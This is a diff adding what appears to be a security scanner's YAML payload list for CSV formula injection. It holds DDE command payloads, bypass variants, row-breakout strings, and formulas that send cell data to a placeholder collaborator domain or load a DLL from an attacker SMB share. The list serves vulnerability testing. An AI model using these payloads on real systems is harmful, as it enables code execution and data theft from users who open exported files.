@@ -1,0 +1,218 @@
+defaults:
+  vuln_type: csv_injection
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # ============================================================
+  # DDE formula injection — basic prefix variants
+  # ============================================================
+  - technique: formula_injection
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 3
+    payload: "=cmd|'/C calc.exe'!A0"
+    notes: "Classic DDE payload for Excel. Opens calculator if macros/DDE enabled."
+    tags: [dde, excel, windows]
+
+  - technique: formula_injection
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 3
+    payload: "+cmd|'/C calc.exe'!A0"
+    notes: "Plus-prefixed DDE. Some parsers strip = but not +."
+    tags: [dde, excel, bypass]
+
+  - technique: formula_injection
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 3
+    payload: "-cmd|'/C calc.exe'!A0"
+    notes: "Minus-prefixed DDE variant. Tests if minus is treated as formula prefix."
+    tags: [dde, excel, bypass]
+
+  - technique: formula_injection
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 3
+    payload: "@SUM(1+1)*cmd|'/C calc.exe'!A0"
+    notes: "At-sign prefixed DDE. Less commonly filtered than = or +."
+    tags: [dde, excel, bypass]
+
+  # ============================================================
+  # Hyperlink exfiltration
+  # ============================================================
+  - technique: formula_injection
+    injection_surface: form_body
+    evidence_type: dns_hit
+    risk: 3
+    payload: "=HYPERLINK(\"http://COLLAB_DOMAIN/?data=\"&A1,\"Click here\")"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Exfiltrate cell A1 value via hyperlink to attacker domain. Requires user click."
+    tags: [exfiltration, hyperlink, oob]
+
+  # ============================================================
+  # Minimal probe
+  # ============================================================
+  - technique: formula_injection
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 2
+    payload: "=1+1"
+    notes: "Minimal formula probe. If exported CSV opens in spreadsheet and shows 2 instead of =1+1, formulas are interpreted."
+    tags: [probe, confirmation]
+
+  # ============================================================
+  # Google Sheets specific
+  # ============================================================
+  - technique: formula_injection
+    injection_surface: form_body
+    evidence_type: dns_hit
+    risk: 3
+    payload: "=IMPORTXML(\"http://COLLAB_DOMAIN/?data=\"&A1,\"//a\")"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Google Sheets IMPORTXML. Exfiltrates cell data to attacker domain automatically."
+    tags: [google_sheets, importxml, exfiltration, oob]
+
+  - technique: formula_injection
+    injection_surface: form_body
+    evidence_type: dns_hit
+    risk: 3
+    payload: "=IMPORTDATA(\"http://COLLAB_DOMAIN/?data=\"&A1)"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Google Sheets IMPORTDATA. Fetches URL with cell data appended."
+    tags: [google_sheets, importdata, exfiltration, oob]
+
+  - technique: formula_injection
+    injection_surface: form_body
+    evidence_type: dns_hit
+    risk: 3
+    payload: "=IMAGE(\"http://COLLAB_DOMAIN/?data=\"&A1)"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Google Sheets IMAGE formula. Loads remote image with data in URL."
+    tags: [google_sheets, image, exfiltration, oob]
+
+  # ============================================================
+  # Remote macro / OLE / WEBSERVICE
+  # ============================================================
+  - technique: formula_injection
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 4
+    payload: "=MSEXCEL|'\\\\ATTACKER_IP\\share\\payload.dll'!'0'"
+    placeholders: [ATTACKER_IP]
+    notes: "Remote DDE/OLE payload. Loads DLL from SMB share. Requires macro/DDE enabled."
+    tags: [dde, remote, smb, macro]
+
+  - technique: formula_injection
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 4
+    payload: "=WEBSERVICE(\"http://COLLAB_DOMAIN/?data=\"&A1)"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "WEBSERVICE function (Excel desktop). Makes HTTP request with cell data."
+    tags: [excel, webservice, exfiltration]
+
+  # ============================================================
+  # Bypass variants
+  # ============================================================
+  - technique: formula_injection
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 3
+    payload: "\t=cmd|'/C calc.exe'!A0"
+    notes: "Tab-prefixed DDE. Tab may be stripped during import, exposing formula."
+    tags: [dde, excel, bypass, tab]
+
+  - technique: formula_injection
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 3
+    payload: "\r\n=cmd|'/C calc.exe'!A0"
+    notes: "Newline-prefixed DDE. Injects formula into new CSV row."
+    tags: [dde, excel, bypass, newline]
+
+  - technique: formula_injection
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 3
+    payload: "=\";=cmd|'/C calc.exe'!A0"
+    notes: "Quoted field with semicolon then formula. May bypass prefix sanitization."
+    tags: [dde, excel, bypass, quoted]
+
+  - technique: formula_injection
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 3
+    payload: "\";=cmd|'/C calc.exe'!A0"
+    notes: "CSV field escape — close quoted field with \", then semicolon delimiter starts new cell containing formula. Exploits CSV structure rather than formula parsing."
+    tags: [dde, excel, bypass, csv_escape, field_breakout]
+
+  # ============================================================
+  # JSON body variants
+  # ============================================================
+  - technique: formula_injection
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 2
+    payload: "=1+1"
+    notes: "Formula probe via JSON body (e.g., profile name, comment field that ends up in CSV export)."
+    tags: [probe, confirmation, json]
+
+  - technique: formula_injection
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "=cmd|'/C calc.exe'!A0"
+    notes: "DDE formula via JSON body field."
+    tags: [dde, excel, json]
+
+  - technique: formula_injection
+    injection_surface: json_body
+    evidence_type: dns_hit
+    risk: 3
+    payload: "=HYPERLINK(\"http://COLLAB_DOMAIN/?data=\"&A1,\"Click\")"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Hyperlink exfiltration via JSON body."
+    tags: [exfiltration, hyperlink, json, oob]
+
+  # ============================================================
+  # LibreOffice specific
+  # ============================================================
+  - technique: formula_injection
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 3
+    payload: "=SHELL(\"calc.exe\")"
+    notes: "LibreOffice SHELL function. Executes command if macro security is low."
+    tags: [libreoffice, shell, rce]
+
+  - technique: formula_injection
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 3
+    payload: "=DDE(\"cmd\";\"/C calc.exe\";\"\")"
+    notes: "LibreOffice DDE syntax (semicolons instead of pipes)."
+    tags: [libreoffice, dde]
+
+  # ============================================================
+  # macOS / Numbers specific
+  # ============================================================
+  - technique: formula_injection
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 2
+    payload: "=CONCAT(A1,B1)"
+    notes: "Apple Numbers / macOS probe. CONCAT is processed in Numbers — if reflected as computed result rather than literal, formula injection is confirmed. Numbers does not support DDE but formula evaluation leaks data between cells."
+    tags: [probe, macos, numbers, confirmation]
+
+  # ============================================================
+  # Multi-cell / row injection
+  # ============================================================
+  - technique: formula_injection
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 3
+    payload: "value\",\"=cmd|'/C calc.exe'!A0\r\ninjected_row,\"=1+1"
+    notes: "CSV row injection. Breaks out of current cell and injects a new row with formulas. Tests whether the app properly escapes CSV field delimiters and row separators."
+    tags: [csv_escape, row_injection, field_breakout]
